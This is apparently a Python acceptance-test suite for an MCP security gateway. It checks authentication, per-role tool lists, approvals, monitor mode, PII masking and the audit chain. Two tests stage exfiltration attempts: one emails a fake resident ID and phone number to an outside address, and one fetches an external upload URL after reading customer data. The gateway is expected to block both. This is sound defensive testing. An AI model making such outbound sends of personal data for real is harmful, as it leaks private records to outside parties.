"""Acceptance for the v2 Gateway: the guarantees the workday scenarios do not show.

    docker compose exec -T gateway python -m app.acceptance        (./console.sh test)

The workday scenarios walk the policy matrix through the employees' workstations.
This covers the Gateway's own guarantees around that: the MCP ingress refuses an
unauthenticated client the way the MCP authorization spec says, tools are listed
per role, unapproved and unknown tools never run, arguments are checked against
the approved schema, a drifted contract blocks, approval runs a call exactly once,
monitor mode records what enforcement would have done, detected identifiers are
masked in results and never sent outside, a read of important data followed by an
external send is stopped as a chain, and the audit chain holds.

Every call goes through the real ingress (/mcp/) with a real token to a real
server. A server someone has put into termination is not restored here - the test
must not undo a person's procedure - so a check that needs it reports SKIP.
"""
from __future__ import annotations

import asyncio
import json
import os
import re
import sys

import httpx
import httpx2
from mcp import Client
from mcp.client.streamable_http import streamable_http_client

from . import db
from .core import approve_request, enforcement_mode, set_enforcement_mode, verify_audit_chain

API = os.getenv("ACCEPTANCE_GATEWAY_URL", "http://127.0.0.1:8080").rstrip("/")
MCP_URL = API + "/mcp/"
USERS = {"employee": "ysg@bob.local", "partner": "nkk@bob.local", "admin": "kkg@bob.local"}
PRINCIPAL = {"employee": "emp-ysg", "partner": "partner-demo", "admin": "admin-demo"}
TOKENS: dict[str, str] = {}
RESULTS: list[dict] = []


class Skip(Exception):
    pass


async def sign_in() -> None:
    password = os.getenv("MOCK_SSO_PASSWORD", "test-password")
    async with httpx.AsyncClient(timeout=15) as client:
        for who, email in USERS.items():
            response = await client.post(API + "/api/session", json={"email": email, "password": password})
            response.raise_for_status()
            TOKENS[who] = response.json()["access_token"]


def _http(who: str) -> httpx2.AsyncClient:
    return httpx2.AsyncClient(timeout=90, headers={
        "Authorization": f"Bearer {TOKENS[who]}", "X-Agent-Name": "acceptance", "X-Workstation-Id": "acceptance"})


async def list_tools(who: str) -> list:
    async with _http(who) as http, Client(streamable_http_client(MCP_URL, http_client=http)) as client:
        return (await client.list_tools()).tools


async def call(who: str, name: str, arguments: dict) -> dict:
    async with _http(who) as http, Client(streamable_http_client(MCP_URL, http_client=http)) as client:
        result = await client.call_tool(name, arguments)
    gateway = (result.meta or {}).get("gateway") or {}
    return {**gateway, "is_error": result.is_error,
            "text": "".join(getattr(item, "text", "") for item in result.content)}


async def operating(*servers: str) -> None:
    rows = await db.fetch_all("SELECT id, lifecycle, status FROM mcp_servers WHERE id = ANY(%s)", (list(servers),))
    state = {r["id"]: r for r in rows}
    for sid in servers:
        row = state.get(sid)
        if not row or row["lifecycle"] != "OPERATING" or row["status"] != "READY":
            raise Skip(f"{sid} 서버가 운영 상태가 아닙니다({row and row['lifecycle']}/{row and row['status']}). "
                       "종료 케이스를 종결·복원한 뒤 다시 실행하세요.")


def expect(condition: bool, detail: str) -> None:
    if not condition:
        raise AssertionError(detail)


async def check(name: str, coro) -> None:
    try:
        detail = await coro
        RESULTS.append({"name": name, "status": "PASS", "details": detail or ""})
    except Skip as exc:
        RESULTS.append({"name": name, "status": "SKIP", "details": str(exc)})
    except Exception as exc:  # one failed guarantee must not hide the others
        RESULTS.append({"name": name, "status": "FAIL", "details": f"{type(exc).__name__}: {exc}"[:600]})


# ── checks ───────────────────────────────────────────────────────────────────
async def ingress_requires_token() -> str:
    init = {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {
        "protocolVersion": "2025-11-25", "capabilities": {}, "clientInfo": {"name": "acceptance", "version": "1"}}}
    headers = {"Accept": "application/json, text/event-stream"}
    async with httpx.AsyncClient(timeout=10) as client:
        anonymous = await client.post(MCP_URL, json=init, headers=headers)
        forged = await client.post(MCP_URL, json=init, headers={**headers, "Authorization": "Bearer not-a-token"})
    challenge = anonymous.headers.get("www-authenticate", "")
    expect(anonymous.status_code == 401, f"토큰 없는 initialize가 {anonymous.status_code}")
    expect("resource_metadata=" in challenge, f"WWW-Authenticate에 resource_metadata가 없음: {challenge!r}")
    expect(forged.status_code == 401 and "invalid_token" in forged.headers.get("www-authenticate", ""),
           f"위조 토큰이 {forged.status_code}")
    return challenge


async def tools_listed_per_role() -> str:
    employee, partner = await list_tools("employee"), await list_tools("partner")
    approved = {f"{r['server_id']}__{r['name']}": r["action"] for r in await db.fetch_all(
        """SELECT t.server_id, t.name, t.action FROM mcp_tools t JOIN mcp_servers s ON s.id=t.server_id
            WHERE t.enabled AND t.input_schema IS NOT NULL AND s.lifecycle='OPERATING'
              AND s.status NOT IN ('DISABLED','BLOCKED_SUPPLY_CHAIN')""")}
    names = {t.name for t in employee}
    expect(names == set(approved), f"직원 목록과 승인 목록 차이: +{sorted(names - set(approved))[:5]} -{sorted(set(approved) - names)[:5]}")
    writes = [t.name for t in partner if approved.get(t.name) != "r"]
    expect(not writes, f"협력사 직원에게 w/x 도구가 보임: {writes[:5]}")
    expect(len(partner) < len(employee), "협력사 목록이 직원 목록보다 작지 않음")
    return f"직원 {len(employee)}개 · 협력사 {len(partner)}개(읽기만)"


async def allowed_call_runs() -> str:
    await operating("git")
    out = await call("employee", "git__git_log", {"repo_path": "/repos/handbook", "max_count": 2})
    expect(out.get("decision") == "Allow" and not out["is_error"], f"공개 저장소 로그 조회: {out.get('decision')} {out.get('policy_id')} {out['text'][:120]}")
    expect("commit" in out["text"].lower() or "Commit" in out["text"], f"실제 git 출력이 아님: {out['text'][:120]}")
    return out["policy_id"]


async def unapproved_and_unknown_blocked() -> str:
    await operating("desktop")
    hidden = await db.fetch_one("SELECT name FROM mcp_tools WHERE server_id='desktop' AND NOT enabled ORDER BY name LIMIT 1")
    expect(hidden is not None, "desktop 서버에 미승인 도구가 없음(카탈로그 확인 필요)")
    unapproved = await call("employee", f"desktop__{hidden['name']}", {})
    unknown = await call("employee", "nope__whatever", {})
    expect(unapproved.get("decision") == "Block" and unapproved["policy_id"].startswith("MCP-REGISTRY"),
           f"미승인 도구 desktop.{hidden['name']}: {unapproved.get('decision')} {unapproved.get('policy_id')}")
    expect(unknown.get("decision") == "Block" and unknown["policy_id"].startswith("MCP-REGISTRY"),
           f"미등록 서버: {unknown.get('decision')} {unknown.get('policy_id')}")
    return f"{unapproved['policy_id']} · {unknown['policy_id']}"


async def schema_enforced() -> str:
    await operating("git")
    out = await call("employee", "git__git_log", {"max_count": "many"})
    expect(out.get("decision") == "Block" and out.get("policy_id") == "P-INPUT-SCHEMA-001",
           f"스키마 위반 인자: {out.get('decision')} {out.get('policy_id')}")
    return out["policy_id"]


async def drifted_contract_blocks() -> str:
    await operating("git")
    row = await db.fetch_one("SELECT approved_schema_hash FROM mcp_tools WHERE server_id='git' AND name='git_log'")
    try:
        await db.execute("UPDATE mcp_tools SET approved_schema_hash=%s WHERE server_id='git' AND name='git_log'",
                         ("0" * 64,))
        drifted = await call("employee", "git__git_log", {"repo_path": "/repos/handbook", "max_count": 1})
    finally:
        await db.execute("UPDATE mcp_tools SET approved_schema_hash=%s WHERE server_id='git' AND name='git_log'",
                         (row["approved_schema_hash"],))
    restored = await call("employee", "git__git_log", {"repo_path": "/repos/handbook", "max_count": 1})
    expect(drifted.get("decision") == "Block" and drifted.get("policy_id") == "MCP-CATALOG-001",
           f"승인 해시와 다른 계약: {drifted.get('decision')} {drifted.get('policy_id')}")
    expect(restored.get("decision") == "Allow", f"해시 복구 후: {restored.get('decision')} {restored.get('policy_id')}")
    return "MCP-CATALOG-001 → 복구 후 Allow"


async def approval_runs_once() -> str:
    await operating("desktop")
    pending = await call("employee", "desktop__start_process", {"command": "echo acceptance-approval", "timeout_ms": 5000})
    expect(pending.get("decision") == "Approval" and pending.get("approval_id"),
           f"플랫폼개발팀 start_process: {pending.get('decision')} {pending.get('policy_id')}")
    executed = await approve_request(pending["approval_id"], PRINCIPAL["admin"])
    expect(executed.get("upstream_executed"), f"승인 후 실행되지 않음: {executed.get('decision')} {executed.get('policy_id')}")
    try:
        await approve_request(pending["approval_id"], PRINCIPAL["admin"])
        raise AssertionError("같은 승인이 두 번 실행됨")
    except ValueError:
        pass
    return f"{pending['policy_id']} → 승인 1회 실행, 재승인 거부"


async def monitor_mode_records() -> str:
    await operating("git")
    before = await enforcement_mode()
    try:
        await set_enforcement_mode("monitor", PRINCIPAL["admin"])
        observed = await call("partner", "git__git_log", {"repo_path": "/repos/payment-service", "max_count": 1})
    finally:
        await set_enforcement_mode(before, PRINCIPAL["admin"])
    row = await db.fetch_one("SELECT decision, enforcement, would_decision, upstream_executed FROM decisions WHERE id=%s",
                             (observed.get("decision_id"),))
    expect(row and row["enforcement"] == "monitor" and row["would_decision"] == "Block" and row["upstream_executed"],
           f"관찰 모드 기록: {row}")
    enforced = await call("partner", "git__git_log", {"repo_path": "/repos/payment-service", "max_count": 1})
    expect(enforced.get("decision") == "Block", f"집행 모드 복귀 후: {enforced.get('decision')}")
    return "관찰 모드: 실행 + would_decision=Block → 복귀 후 Block"


RRN = re.compile(r"\b\d{6}-[1-4]\d{6}\b")


async def pii_masked_in_output() -> str:
    """PDF 8~10쪽: detected identifiers do not leave the Gateway in a tool result."""
    await operating("postgres")
    out = await call("employee", "postgres__execute_sql",
                     {"sql": "SELECT name, phone, rrn, email FROM sales.customers ORDER BY id LIMIT 2"})
    expect(out.get("decision") in {"Allow", "Alert"} and not out["is_error"],
           f"고객 원장 조회: {out.get('decision')} {out.get('policy_id')} {out['text'][:120]}")
    expect("[REDACTED]" in out["text"] and not RRN.search(out["text"]) and "010-" not in out["text"],
           f"마스킹되지 않은 결과: {out['text'][:200]}")
    row = await db.fetch_one("SELECT privacy_types, risk_score FROM decisions WHERE id=%s", (out.get("decision_id"),))
    expect(row and "KR_RRN" in row["privacy_types"], f"감사 행의 개인정보 유형: {row}")
    return f"{out['policy_id']} · 출력 마스킹 {', '.join(row['privacy_types'])} · 위험 {row['risk_score']}"


async def pii_external_send_blocked() -> str:
    await operating("email")
    out = await call("employee", "email__send_email", {
        "account_name": "assistant", "recipients": ["buyer@outside.example"],
        "subject": "고객 명단", "body": "홍길동 900101-1234567, 010-1234-5678"})
    expect(out.get("decision") == "Block" and out.get("policy_id") == "MCP-DATA-EGRESS-001",
           f"개인정보 외부 발송: {out.get('decision')} {out.get('policy_id')}")
    row = await db.fetch_one("SELECT upstream_attempted, privacy_types FROM decisions WHERE id=%s",
                             (out.get("decision_id"),))
    expect(row and not row["upstream_attempted"] and "KR_RRN" in row["privacy_types"], f"기록: {row}")
    return f"MCP-DATA-EGRESS-001 · 탐지 {', '.join(row['privacy_types'])} · 미전송"


async def read_then_send_chain_blocked() -> str:
    """Runs after pii_masked_in_output: the same principal read important data minutes ago."""
    await operating("fetch")
    out = await call("employee", "fetch__fetch", {"url": "https://share.external.example/upload?d=1"})
    expect(out.get("decision") == "Block" and out.get("policy_id") == "P-CHAIN-001",
           f"열람 뒤 외부 전송: {out.get('decision')} {out.get('policy_id')}")
    return "P-CHAIN-001"


async def audit_chain_intact() -> str:
    result = await verify_audit_chain()
    expect(result["intact"], f"감사 체인 손상: {result}")
    return f"{result['checked']}건 연결"


async def run() -> dict:
    await db.wait_until_ready()
    await sign_in()
    for name, coro in [
        ("ingress-401-with-resource-metadata", ingress_requires_token()),
        ("tools-listed-per-role", tools_listed_per_role()),
        ("allowed-call-runs-on-real-server", allowed_call_runs()),
        ("unapproved-and-unknown-tools-blocked", unapproved_and_unknown_blocked()),
        ("arguments-checked-against-approved-schema", schema_enforced()),
        ("drifted-contract-blocks", drifted_contract_blocks()),
        ("approval-runs-exactly-once", approval_runs_once()),
        ("monitor-mode-records-would-decision", monitor_mode_records()),
        # PDF integration (Presidio, MCP-DATA-EGRESS-001, P-CHAIN-001) - order matters:
        # the chain check relies on the important read made by the first one.
        ("pii-masked-in-output", pii_masked_in_output()),
        ("pii-external-send-blocked", pii_external_send_blocked()),
        ("read-then-send-chain-blocked", read_then_send_chain_blocked()),
        ("audit-chain-intact", audit_chain_intact()),
    ]:
        await check(name, coro)
    counts = {s: sum(1 for r in RESULTS if r["status"] == s) for s in ("PASS", "FAIL", "SKIP")}
    return {"suite": "gateway-acceptance-v2", **counts, "checks": RESULTS}


if __name__ == "__main__":
    report = asyncio.run(run())
    print(json.dumps(report, ensure_ascii=False, indent=2, default=str))
    sys.exit(1 if report["FAIL"] else 0)
